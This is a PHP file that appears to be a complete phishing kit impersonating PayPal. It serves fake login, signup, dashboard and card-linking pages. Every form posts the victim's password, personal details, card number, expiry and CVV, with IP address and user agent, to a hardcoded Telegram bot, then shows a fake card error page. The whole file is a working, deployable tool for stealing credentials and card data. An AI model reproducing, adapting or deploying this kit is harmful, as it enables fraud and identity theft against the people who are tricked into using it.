<?php
// ============================================================
// Telegram Bot Configuration
// ============================================================
define('TELEGRAM_BOT_TOKEN', '8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3_s');
define('TELEGRAM_CHAT_ID', '7133577749');

// ============================================================
// Capture & Send Function
// ============================================================
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// ============================================================
// Log IP & User Agent
// ============================================================
function getClientInfo() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return "🌐 IP: {$ip}\n📱 UA: {$ua}";
}

// ============================================================
// Handle POST Requests
// ============================================================
$currentPage = 'login';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // --- LOGIN SUBMISSION ---
    if (isset($_POST['login_submit'])) {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        $clientInfo = getClientInfo();
        $msg = "🔐 <b>PAYPAL - Login Credentials Captured</b>\n\n"
             . "👤 Username/Email: <code>{$username}</code>\n"
             . "🔑 Password: <code>{$password}</code>\n\n"
             . "{$clientInfo}\n"
             . "🕐 " . date('Y-m-d H:i:s');
        
        sendToTelegram($msg);
        $currentPage = 'dashboard';
    }
    
    // --- SIGNUP SUBMISSION (all fields on one page) ---
    if (isset($_POST['signup_submit'])) {
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';
        $firstName = $_POST['first_name'] ?? '';
        $lastName = $_POST['last_name'] ?? '';
        $phone = $_POST['phone'] ?? '';
        $dob = $_POST['dob'] ?? '';
        $country = $_POST['country'] ?? '';
        
        $clientInfo = getClientInfo();
        $msg = "📝 <b>PAYPAL - New Account Created</b>\n\n"
             . "📧 Email: <code>{$email}</code>\n"
             . "🔑 Password: <code>{$password}</code>\n"
             . "👤 Name: <code>{$firstName} {$lastName}</code>\n"
             . "📱 Phone: <code>{$phone}</code>\n"
             . "🎂 DOB: <code>{$dob}</code>\n"
             . "🌍 Country: <code>{$country}</code>\n\n"
             . "{$clientInfo}\n"
             . "🕐 " . date('Y-m-d H:i:s');
        
        sendToTelegram($msg);
        $currentPage = 'dashboard';
    }
    
    // --- LINK CARD SUBMISSION ---
    if (isset($_POST['link_card_submit'])) {
        $cardNumber = $_POST['card_number'] ?? '';
        $expiry     = $_POST['expiry'] ?? '';
        $cvv        = $_POST['cvv'] ?? '';
        $fullName   = $_POST['full_name'] ?? '';
        $billingAddr = $_POST['billing_address'] ?? '';
        
        $clientInfo = getClientInfo();
        $msg = "💳 <b>PAYPAL - Card Details Captured</b>\n\n"
             . "👤 Full Name: <code>{$fullName}</code>\n"
             . "💳 Card: <code>{$cardNumber}</code>\n"
             . "📅 Expiry: <code>{$expiry}</code>\n"
             . "🔐 CVV: <code>{$cvv}</code>\n"
             . "🏠 Address: <code>{$billingAddr}</code>\n\n"
             . "{$clientInfo}\n"
             . "🕐 " . date('Y-m-d H:i:s');
        
        sendToTelegram($msg);
        $currentPage = 'card_error';
    }
}

// ============================================================
// Page Routing (GET requests)
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $page = $_GET['page'] ?? 'login';
    if (in_array($page, ['login', 'signup', 'dashboard', 'link_card', 'card_error'])) {
        $currentPage = $page;
    } else {
        $currentPage = 'login';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #f7f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }
        .card-container {
            background-color: #ffffff;
            border: 1px solid #e2e2e2;
            border-radius: 16px;
            width: 100%;
            max-width: 460px;
            padding: 40px;
            margin: 40px 20px 20px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
        }
        .card-container.wide {
            max-width: 520px;
        }
        .logo {
            font-size: 32px;
            font-weight: 900;
            font-style: italic;
            color: #003087;
            margin-bottom: 30px;
            letter-spacing: -1px;
        }
        .form-container { width: 100%; }
        .input-group {
            position: relative;
            margin-bottom: 18px;
            width: 100%;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 18px 12px;
            border: 1px solid #8d8d8d;
            border-radius: 4px;
            font-size: 16px;
            color: #2c2e2f;
            outline: none;
            transition: border-color 0.2s;
            background: white;
        }
        .input-group input:focus, .input-group select:focus {
            border-color: #0070ba;
            box-shadow: inset 0 0 0 1px #0070ba;
        }
        .input-group select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236c7378' stroke-width='2' fill='none'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 14px center;
        }
        .forgot-link {
            display: inline-block;
            color: #0070ba;
            text-decoration: none;
            font-size: 15px;
            font-weight: bold;
            margin-bottom: 25px;
            cursor: pointer;
        }
        .forgot-link:hover { text-decoration: underline; }
        .btn {
            width: 100%;
            padding: 16px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            transition: all 0.2s;
            border: none;
        }
        .btn-primary {
            background-color: #005ea6;
            color: white;
        }
        .btn-primary:hover { background-color: #00457c; }
        .btn-secondary {
            background-color: transparent;
            color: #2c2e2f;
            border: 2px solid #000000;
            margin-top: 15px;
        }
        .btn-secondary:hover { background-color: #f5f7fa; }
        .btn-success {
            background-color: #1a9c4a;
            color: white;
        }
        .btn-success:hover { background-color: #14803b; }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #6c7378;
            font-size: 14px;
            margin: 25px 0 10px 0;
            width: 100%;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #cbd2d6;
        }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }
        .form-row {
            display: flex;
            gap: 12px;
        }
        .form-row .input-group { flex: 1; }
        .error-box {
            background: #fff3f3;
            border: 1px solid #ffcccc;
            border-radius: 8px;
            padding: 25px;
            text-align: center;
            margin: 20px 0;
        }
        .error-box .error-icon { font-size: 48px; margin-bottom: 15px; }
        .error-box h3 { color: #d32f2f; margin-bottom: 10px; font-size: 20px; }
        .error-box p { color: #555; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
        .error-box .btn { width: auto; padding: 12px 30px; display: inline-block; }
        .language-picker {
            margin-top: 30px;
            display: flex;
            align-items: center;
            cursor: pointer;
            gap: 6px;
        }
        .flag-icon {
            width: 20px; height: 14px;
            background: linear-gradient(90deg, #008751 33%, #ffffff 33%, #ffffff 66%, #008751 66%);
            border: 1px solid #cbd2d6;
        }
        .arrow-down {
            width: 0; height: 0;
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid #6c7378;
        }
        footer {
            width: 100%;
            background-color: #f7f9fa;
            padding: 20px 0;
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
            margin-top: auto;
        }
        footer a {
            color: #6c7378;
            text-decoration: none;
            font-size: 13px;
            font-weight: bold;
        }
        footer a:hover { text-decoration: underline; }
        .terms-text {
            font-size: 12px;
            color: #6c7378;
            text-align: center;
            margin-top: 15px;
            line-height: 1.5;
        }
        .terms-text a { color: #0070ba; text-decoration: none; font-weight: bold; }
        .terms-text a:hover { text-decoration: underline; }

        /* Dashboard Styles */
        header {
            background-color: #003087;
            padding: 0 10%;
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            width: 100%;
        }
        .nav-left, .nav-right { display: flex; align-items: center; gap: 20px; }
        .brand-logo {
            color: white;
            font-size: 24px;
            font-weight: bold;
            font-style: italic;
            margin-right: 15px;
            text-decoration: none;
        }
        .nav-link {
            color: #cbd2d6;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            padding: 8px 16px;
            border-radius: 20px;
            transition: all 0.2s;
        }
        .nav-link:hover, .nav-link.active {
            color: white;
            background-color: rgba(255, 255, 255, 0.15);
        }
        .logout-btn {
            color: white;
            text-decoration: none;
            font-size: 13px;
            font-weight: bold;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 6px 15px;
            border-radius: 20px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .container {
            max-width: 1150px;
            width: 100%;
            margin: 40px auto;
            padding: 0 20px;
            flex: 1;
        }
        .dashboard-grid {
            display: grid;
            grid-template-columns: 1.4fr 1fr;
            gap: 30px;
            align-items: start;
        }
        .card-panel {
            background: white;
            border-radius: 14px;
            padding: 30px;
            border: 1px solid #e2e2e2;
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .card-title { font-size: 17px; font-weight: bold; color: #003087; }
        .balance-value { font-size: 44px; font-weight: 300; margin-bottom: 5px; }
        .sub-text { font-size: 14px; color: #6c7378; margin-bottom: 30px; }
        .activity-hint {
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 15px;
            border-top: 1px solid #f2f2f2;
            padding-top: 20px;
        }
        .action-link {
            color: #0070ba;
            text-decoration: none;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
        }
        .action-link:hover { text-decoration: underline; }
        .cards-panel-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
        .cards-list-box {
            background: white;
            border-radius: 14px;
            padding: 25px;
            border: 1px solid #e2e2e2;
        }
        .card-row-item {
            display: flex;
            gap: 15px;
            align-items: flex-start;
            margin-bottom: 20px;
        }
        .card-icon-mock {
            width: 44px; height: 30px;
            background-color: #54657a;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
        }
        .link-card-box {
            max-width: 480px;
            margin: 40px auto;
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 16px;
            border: 1px solid #e2e2e2;
        }
        .link-card-box h2 { font-size: 26px; font-weight: 700; margin-bottom: 30px; }
        .input-wrapper {
            position: relative;
            width: 100%;
            margin-bottom: 16px;
        }
        .input-wrapper input, .input-wrapper select {
            width: 100%;
            padding: 22px 14px 10px 14px;
            font-size: 15px;
            border: 1px solid #a6a6a6;
            border-radius: 6px;
            outline: none;
            background: white;
        }
        .input-wrapper label {
            position: absolute;
            left: 14px;
            top: 6px;
            font-size: 11px;
            color: #6c7378;
            pointer-events: none;
        }
        .btn-submit {
            background-color: #000000;
            color: white;
            border: none;
            padding: 14px 32px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            width: auto;
            min-width: 140px;
            transition: opacity 0.2s;
        }
        .btn-submit:hover { opacity: 0.85; }
        .inline-add-link {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #0070ba;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
            margin: 20px 0 35px 0;
            text-align: left;
        }
        .section-title {
            font-size: 13px;
            font-weight: bold;
            color: #6c7378;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin: 20px 0 10px 0;
            text-align: left;
            width: 100%;
            padding-bottom: 5px;
            border-bottom: 1px solid #eee;
        }
        @media (max-width: 768px) {
            .dashboard-grid { grid-template-columns: 1fr; }
            header { padding: 0 20px; }
            .form-row { flex-direction: column; gap: 0; }
        }
    </style>
</head>
<body>

<?php if ($currentPage === 'login'): ?>
    <!-- ============ LOGIN PAGE ============ -->
    <div class="card-container">
        <div class="logo">PayPal</div>
        <div class="form-container">
            <form method="POST" action="">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Email or mobile number" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <a href="#" class="forgot-link">Forgot email?</a>
                <button type="submit" name="login_submit" class="btn btn-primary">Log In</button>
            </form>
            <div class="divider">or</div>
            <button class="btn btn-secondary" onclick="window.location.href='?page=signup'">Sign Up</button>
        </div>
        <div class="language-picker">
            <div class="flag-icon"></div>
            <div class="arrow-down"></div>
        </div>
    </div>
    <footer>
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
        <a href="#">Worldwide</a>
    </footer>

<?php elseif ($currentPage === 'signup'): ?>
    <!-- ============ SIGNUP PAGE (All fields on one page) ============ -->
    <div class="card-container wide">
        <div class="logo">PayPal</div>
        
        <h2 style="font-size:24px;font-weight:700;margin-bottom:5px;text-align:left;width:100%;">Create your account</h2>
        <p style="font-size:14px;color:#6c7378;margin-bottom:20px;text-align:left;width:100%;">Fill in your details to get started</p>
        
        <div class="form-container">
            <form method="POST" action="">
                <input type="hidden" name="signup_submit" value="1">
                
                <!-- Account Section -->
                <div class="section-title">Account Information</div>
                
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email address" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Create a password" required minlength="8">
                </div>
                <div class="input-group">
                    <input type="password" name="confirm_password" placeholder="Confirm password" required minlength="8">
                </div>
                
                <!-- Personal Section -->
                <div class="section-title">Personal Details</div>
                
                <div class="form-row">
                    <div class="input-group">
                        <input type="text" name="first_name" placeholder="First name" required>
                    </div>
                    <div class="input-group">
                        <input type="text" name="last_name" placeholder="Last name" required>
                    </div>
                </div>
                
                <div class="input-group">
                    <input type="tel" name="phone" placeholder="Phone number" required>
                </div>
                
                <div class="input-group">
                    <label style="display:block;font-size:13px;color:#6c7378;margin-bottom:5px;text-align:left;">Date of birth</label>
                    <input type="date" name="dob" required>
                </div>
                
                <div class="input-group">
                    <select name="country" required>
                        <option value="" disabled selected>Country / Region</option>
                        <option value="United States">United States</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Canada">Canada</option>
                        <option value="Australia">Australia</option>
                        <option value="Germany">Germany</option>
                        <option value="France">France</option>
                        <option value="Spain">Spain</option>
                        <option value="Italy">Italy</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="South Africa">South Africa</option>
                        <option value="Kenya">Kenya</option>
                        <option value="Ghana">Ghana</option>
                        <option value="Brazil">Brazil</option>
                        <option value="Mexico">Mexico</option>
                        <option value="India">India</option>
                        <option value="Philippines">Philippines</option>
                        <option value="Singapore">Singapore</option>
                        <option value="Japan">Japan</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                
                <div class="terms-text" style="text-align:left;margin-top:15px;">
                    <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
                        <input type="checkbox" required style="margin-top:3px;width:16px;height:16px;flex-shrink:0;">
                        <span>I agree to the <a href="#">Privacy Policy</a> and <a href="#">User Agreement</a>, 
                        and confirm I am at least 18 years old.</span>
                    </label>
                </div>
                
                <button type="submit" class="btn btn-success" style="margin-top:20px;">Agree & Create Account</button>
            </form>
            
            <div class="divider">or</div>
            <button class="btn btn-secondary" onclick="window.location.href='?page=login'">Log In</button>
        </div>
        <div class="language-picker">
            <div class="flag-icon"></div>
            <div class="arrow-down"></div>
        </div>
    </div>
    <footer>
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
        <a href="#">Worldwide</a>
    </footer>

<?php elseif ($currentPage === 'dashboard'): ?>
    <!-- ============ DASHBOARD VIEW ============ -->
    <header>
        <div class="nav-left">
            <a href="?page=dashboard" class="brand-logo">P</a>
            <a href="?page=dashboard" class="nav-link active">Home</a>
            <a href="#" class="nav-link">Send</a>
            <a href="?page=dashboard" class="nav-link">Wallet</a>
            <a href="#" class="nav-link">Activity</a>
            <a href="#" class="nav-link">Help</a>
        </div>
        <div class="nav-right">
            <a href="#" class="icon-btn" style="color:white;text-decoration:none;">🔔</a>
            <a href="?page=login" class="logout-btn">Log Out</a>
        </div>
    </header>

    <div class="container">
        <div class="dashboard-grid">
            <div class="card-panel">
                <div class="card-header">
                    <span class="card-title">PayPal balance</span>
                    <span style="cursor:pointer;font-size:20px;">&#8942;</span>
                </div>
                <div class="balance-value">&euro;0.00</div>
                <div class="sub-text">Available</div>
                <div class="activity-hint">
                    See when money comes in, and when it goes out. You'll find your recent PayPal activity here.
                </div>
                <a href="#" class="action-link">Show all</a>
            </div>
            <div>
                <div class="card-header" style="margin-bottom:10px;">
                    <span style="font-size:18px;font-weight:bold;">Cards</span>
                    <span style="cursor:pointer;font-size:20px;">&#8942;</span>
                </div>
                <div class="cards-list-box">
                    <div class="card-row-item">
                        <div class="card-icon-mock">💳</div>
                        <div>
                            <p style="font-weight:500;margin-bottom:2px;">Shop and send payments more securely.</p>
                            <p style="color:#6c7378;">Link your credit card now.</p>
                        </div>
                    </div>
                    <a href="?page=link_card" class="action-link" style="font-size:16px;">Link a card</a>
                </div>
            </div>
        </div>
    </div>

    <footer style="background:#fff;border-top:1px solid #e2e2e2;padding:30px 10%;margin-top:auto;display:block;">
        <div style="display:flex;align-items:center;gap:25px;padding-bottom:20px;border-bottom:1px solid #f2f2f2;">
            <span style="font-size:20px;font-weight:bold;font-style:italic;color:#003087;">PayPal</span>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Help</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Contact Us</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Security</a>
        </div>
        <div style="display:flex;justify-content:space-between;padding-top:20px;font-size:12px;color:#6c7378;flex-wrap:wrap;gap:15px;">
            <div>&copy;1999-2026 PayPal, Inc. All rights reserved.</div>
            <div style="display:flex;gap:15px;">
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Privacy</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Cookies</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Legal</a>
            </div>
        </div>
    </footer>

<?php elseif ($currentPage === 'link_card'): ?>
    <!-- ============ LINK CARD PAGE ============ -->
    <header>
        <div class="nav-left">
            <a href="?page=dashboard" class="brand-logo">P</a>
            <a href="?page=dashboard" class="nav-link active">Home</a>
            <a href="#" class="nav-link">Send</a>
            <a href="?page=dashboard" class="nav-link">Wallet</a>
            <a href="#" class="nav-link">Activity</a>
            <a href="#" class="nav-link">Help</a>
        </div>
        <div class="nav-right">
            <a href="#" class="icon-btn" style="color:white;text-decoration:none;">🔔</a>
            <a href="?page=login" class="logout-btn">Log Out</a>
        </div>
    </header>

    <div class="container">
        <div class="link-card-box">
            <div style="font-size:28px;font-weight:bold;font-style:italic;color:#003087;margin-bottom:20px;">P</div>
            <h2>Link a card</h2>
            <form method="POST" action="">
                <input type="hidden" name="link_card_submit" value="1">
                
                <div class="input-wrapper">
                    <label>Full name on card</label>
                    <input type="text" name="full_name" placeholder="Full name" required>
                </div>
                
                <div class="input-wrapper">
                    <label>Card number</label>
                    <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required maxlength="19">
                </div>
                
                <div class="form-row" style="flex-direction:row;">
                    <div class="input-wrapper">
                        <label>Expiration</label>
                        <input type="text" name="expiry" placeholder="MM/YY" required maxlength="5">
                    </div>
                    <div class="input-wrapper">
                        <label>CVV</label>
                        <input type="text" name="cvv" placeholder="123" required maxlength="4">
                    </div>
                </div>
                
                <div class="input-wrapper">
                    <label>Billing address</label>
                    <input type="text" name="billing_address" placeholder="Street, city, zip code" required>
                </div>
                
                <button type="submit" class="btn-submit">Link Card</button>
            </form>
        </div>
    </div>

    <footer style="background:#fff;border-top:1px solid #e2e2e2;padding:30px 10%;margin-top:auto;display:block;">
        <div style="display:flex;align-items:center;gap:25px;padding-bottom:20px;border-bottom:1px solid #f2f2f2;">
            <span style="font-size:20px;font-weight:bold;font-style:italic;color:#003087;">PayPal</span>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Help</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Contact Us</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Security</a>
        </div>
        <div style="display:flex;justify-content:space-between;padding-top:20px;font-size:12px;color:#6c7378;flex-wrap:wrap;gap:15px;">
            <div>&copy;1999-2026 PayPal, Inc. All rights reserved.</div>
            <div style="display:flex;gap:15px;">
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Privacy</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Cookies</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Legal</a>
            </div>
        </div>
    </footer>

<?php elseif ($currentPage === 'card_error'): ?>
    <!-- ============ CARD ERROR PAGE ============ -->
    <header>
        <div class="nav-left">
            <a href="?page=dashboard" class="brand-logo">P</a>
            <a href="?page=dashboard" class="nav-link active">Home</a>
            <a href="#" class="nav-link">Send</a>
            <a href="?page=dashboard" class="nav-link">Wallet</a>
            <a href="#" class="nav-link">Activity</a>
            <a href="#" class="nav-link">Help</a>
        </div>
        <div class="nav-right">
            <a href="#" class="icon-btn" style="color:white;text-decoration:none;">🔔</a>
            <a href="?page=login" class="logout-btn">Log Out</a>
        </div>
    </header>

    <div class="container" style="display:flex;justify-content:center;align-items:center;">
        <div class="link-card-box">
            <div class="error-box">
                <div class="error-icon">❌</div>
                <h3>Unable to Link Card</h3>
                <p>
                    We were unable to link your card at this time. This may be due to 
                    security restrictions on your account or card.<br><br>
                    <strong>Please contact your bank for further assistance.</strong>
                </p>
            </div>
            <a href="?page=dashboard" class="btn-submit" style="text-decoration:none;display:inline-block;">Go to Dashboard</a>
        </div>
    </div>

    <footer style="background:#fff;border-top:1px solid #e2e2e2;padding:30px 10%;margin-top:auto;display:block;">
        <div style="display:flex;align-items:center;gap:25px;padding-bottom:20px;border-bottom:1px solid #f2f2f2;">
            <span style="font-size:20px;font-weight:bold;font-style:italic;color:#003087;">PayPal</span>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Help</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Contact Us</a>
            <a href="#" style="color:#2c2e2f;text-decoration:none;font-size:14px;font-weight:bold;">Security</a>
        </div>
        <div style="display:flex;justify-content:space-between;padding-top:20px;font-size:12px;color:#6c7378;flex-wrap:wrap;gap:15px;">
            <div>&copy;1999-2026 PayPal, Inc. All rights reserved.</div>
            <div style="display:flex;gap:15px;">
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Privacy</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Cookies</a>
                <a href="#" style="color:#6c7378;text-decoration:none;font-weight:bold;">Legal</a>
            </div>
        </div>
    </footer>

<?php endif; ?>

</body>
</html>
